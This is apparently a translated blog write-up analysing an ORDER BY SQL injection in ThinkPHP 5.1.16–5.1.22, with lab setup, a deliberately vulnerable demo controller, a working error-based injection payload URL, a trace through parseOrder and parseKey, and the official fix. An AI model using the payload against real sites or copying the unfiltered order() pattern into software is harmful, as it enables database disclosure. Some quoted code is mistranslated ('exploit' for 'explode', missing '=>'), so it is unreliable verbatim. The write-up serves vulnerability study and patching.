# ThinkPHP5.1.x SQL Injection (OrderBy)

Author: H3rmesk1t

Data: 2021.08.14

# Vulnerability Summary
- This vulnerability exists in the parseOrder method of the Builder class. Since the program does not filter the data well, it directly splices the data into SQL statements, which ultimately leads to the occurrence of SQL injection vulnerability.
- Vulnerability impact version: 5.1.16<=ThinkPHP5<=5.1.22

# Initial configuration
Get the test environment code

```bash
composer create-project --prefer-dist topthink/think=5.1.22 tpdemo
```
![Insert the picture description here](https://img-blog.csdnimg.cn/dd8a746b98b14814b42c1b38f4a9a21b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Set the require field of the composer.json file to the following

```bash
"require": {
        "php": ">=5.6.0",
        "topthink/framework": "5.1.22"
    },
```

Then execute `composer update`

![Insert the picture description here](https://img-blog.csdnimg.cn/9b78c4a288c5418a8752cc3c7c00157d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

In the downloaded source code, the content of `application/index/controller/Index.php` needs to be modified.

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $orderby = request()->get('orderby');
        $result = db('users')->where(['username' ='mochazz'])->order($orderby)->find();
        var_dump($result);
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:) </h1><pThinkPHP V5.1<br/><span style="font-size:30px">12 years of original intention remains unchanged (2006-2018) - Your trustworthy PHP framework</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    }
}
```

Configure database-related information in the `config/database.php` file, and enable `app_debug` and `app_trace` in `config/app.php` to create the database information as follows

````sql
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null
);
insert into users(id,username) values(1,'H3rmesk1t');
```
# Vulnerability Exploit

Payload

````bas
http://127.0.0.1/cms/public/index.php?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1
```
![Insert the picture description here](https://img-blog.csdnimg.cn/c132f957a0b241d989339f8b8e2b74d7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Analysis

First, the data will enter the `input` method in the `Request` class, and will be filtered and casted by the `filterValue` method and return `$data`

![Insert the picture description here](https://img-blog.csdnimg.cn/a879dfacf595446e87b72613aa1e1c19.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Here, the `array_walk_recursive` function recursively calls the `filterValue` filter function to the members in the array, but the `filterValue` filter function, but the `key` of the array, only filters the `value` of the array. The data entered by the user will enter the SQL query method of the framework as it is, and enters the `Query` class

![Insert the picture description here](https://img-blog.csdnimg.cn/cb404680cc874cf1b17cfcec3420ad1d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![Insert the picture description here](https://img-blog.csdnimg.cn/3cf76fc4d95a4ffda18cab595387af93.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Malicious Payload is passed directly to `options['order']` without any filtering

![Insert the picture description here](https://img-blog.csdnimg.cn/6ac2d9f671c44a7289913e6ee1bad32a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Then call the `find` method, here `$this->connection` is the `think/db/connection/Mysql` class, inheriting from the `Connection` class, so continue to call the `find` method of this class here

!
[Insert the image description here](https://img-blog.csdnimg.cn/4dccfe114bc4402f9df5aae820915734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/6f81151b864a4ec99a7b8d65e1e0996a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

This method continues to call the `$this->builder`, that is, the `select` method of the `think/db/builder/Mysql` class. This method uses the `str_replace` function to fill the data into the SQL statement.

![Insert the picture description here](https://img-blog.csdnimg.cn/24ff9d25efd4471584f51cad77e74cce.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Then the `parseOrder` method is called and the method is followed up. `$order` is the input data. Then, after the `parseKey` method is processed, it is returned to `$array`, and follow up to view the implementation of the method

```php
protected function parseOrder(Query $query, $order)
    {
        if (empty($order)) {
            return '';
        }

        $array = [];

        foreach ($order as $key =$val) {
            if ($val instanceof Expression) {
                $array[] = $val->getValue();
            } elseif (is_array($val)) {
                $array[] = $this->parseOrderField($query, $key, $val);
            } elseif ('[rand]' == $val) {
                $array[] = $this->parseRand($query);
            } else {
                if (is_numeric($key)) {
                    list($key, $sort) = exploit(' ', strpos($val, ' ') ? $val : $val . ' ');
                } else {
                    $sort = $val;
                }

                $sort = strtoupper($sort);
                $sort = in_array($sort, ['ASC', 'DESC'], true) ? ' ' . $sort : '';
                $array[] = $this->parseKey($query, $key, true) . $sort;
            }
        }

        return ' ORDER BY ' . implode(',', $array);
    }
```

Follow up `thinkphp/library/think/db/builder/Mysql.php`, which adds backticks to both ends of the variable `$key` for splicing without any filtering

![Insert the picture description here](https://img-blog.csdnimg.cn/62ae9f308d0e4ba88cb53cd6ec2c6862.png#pic_center)

Finally, a SQL injection payload with ORDER BY is returned to the SQL statement to be executed, implementing ORDER BY injection

![Insert the picture description here](https://img-blog.csdnimg.cn/cfac012337e04fa88fedf30be2ed7973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Complete method call, from bottom to top

![Insert the picture description here](https://img-blog.csdnimg.cn/def8944016494bcb8a55675674e0c0b2.png#pic_center)
# Vulnerability Fix

The official fix is: check the variable before splicing the string to see if there are two symbols: `) and #`

![Insert the picture description here](https://img-blog.csdnimg.cn/c8018d097195471d915b005dc70f489b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Attack summary

Refer to Master Mochazz's audit process

![Insert the picture description here](https://img-blog.csdnimg.cn/8cc7f936972f41769c25c9f623ad8f07.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)